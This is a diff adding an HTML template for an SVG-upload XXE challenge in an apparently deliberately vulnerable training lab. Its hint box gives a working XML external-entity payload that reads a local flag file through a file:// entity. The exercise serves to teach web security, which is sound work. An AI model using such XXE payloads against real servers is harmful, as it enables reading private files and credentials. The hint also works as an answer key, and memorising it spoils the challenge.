@@ -1,0 +1,33 @@
+{% extends "base.html" %}
+{% block title %}NeonParser — SVG Upload XXE{% endblock %}
+{% block content %}
+<h1>Challenge 5 &mdash; SVG Upload XXE</h1>
+<p style="color: var(--text-muted); margin-bottom: 1.5rem;">
+    Upload an SVG image. The server parses it as XML and extracts text content. Since SVG is XML, you can embed XXE payloads.
+</p>
+
+<div class="card">
+    <h3>Hint</h3>
+    <div class="code-block">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///app/flag5.txt"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</div>
+</div>
+
+<div class="card">
+    <form method="POST" enctype="multipart/form-data">
+        <label for="svg-file">SVG File</label>
+        <input type="file" id="svg-file" name="svg" accept=".svg,image/svg+xml">
+        <button type="submit">Upload SVG</button>
+    </form>
+</div>
+
+{% if error %}
+<div class="alert alert-error">{{ error }}</div>
+{% endif %}
+
+{% if result %}
+<div class="flag-box">{{ result }}</div>
+{% endif %}
+{% endblock %}
